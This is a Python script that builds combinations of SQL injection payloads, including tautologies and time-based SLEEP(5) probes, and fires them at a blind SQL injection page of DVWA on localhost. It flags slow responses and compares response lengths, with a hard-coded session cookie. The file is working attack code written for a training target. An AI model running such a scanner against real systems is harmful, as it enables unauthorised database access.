import requests
import ollama
import itertools
import urllib.parse
import time
import json

# Test with DVWA.
def sql_injector_generator():
    # Define some common SQL injection characters
    chars = ["'", "\"", "--", "#", "/*", "*/"]

    payloads = [
        "{}",
        "{} OR 1=1{}",
        "{} OR 'a'='a'{}",
        "{} OR 1=1'{}",
        "{} AND SLEEP(5){}",
        "{} OR SLEEP(5){}",
    ]

    # Generate combinations of characters
    generated_payloads = []
    for payload in payloads:
        for char1, char2 in itertools.product(chars, repeat=2):
            generated_payloads.append(payload.format(char1, char2))

    return generated_payloads


def requester(url_endpoint):
    cookies = {
        'security':'low',
        'PHPSESSID':'229b0e4136429ac9df598e709d574238'
    }
    try:
        r = requests.get(url_endpoint, cookies=cookies)
        return r
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL: {e}")
        return False    

def main():
    injection = sql_injector_generator()
    content_data = []
    for payload in injection:
        encoded_payload = urllib.parse.quote(payload)
        url = f"http://localhost/vulnerabilities/sqli_blind/?id=1{encoded_payload}&Submit=Submit#"
        
        # Start the tests.
        try:
            start_time = time.time()
            r = requester(url)
            end_time = time.time()
            elapsed_time = end_time - start_time
            
            # Check for Content-Length diffs
            if "Content-Length" in r.headers:
                content_length = int(r.headers["Content-Length"])
                content_data.append({
                    "payload": payload,
                    "content_length": content_length
                })
            else:
                print("Content-Length header not found.")
            
            # If sleep payloads actually fire trigger alert.
            if elapsed_time >= 5:
                print(f"[+] Potential SQL Injection found with: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"Error fetching URL: {e}")
                    
    # Find highest and lowest content lengths
    if content_data:
        highest_length = max(content_data, key=lambda x: x['content_length'])
        lowest_length = min(content_data, key=lambda x: x['content_length'])
        print(f"Highest Content Length: {highest_length['content_length']} with payload: {highest_length['payload']}")
        print(f"Lowest Content Length: {lowest_length['content_length']} with payload: {lowest_length['payload']}")
    else:
        print("No Content-Length data found.")


if __name__ == "__main__":
    begin_runtime = time.time()
    main()
    end_runtime = time.time()
    runtime = end_runtime - begin_runtime
    print(f"[+] Time completed: {runtime}")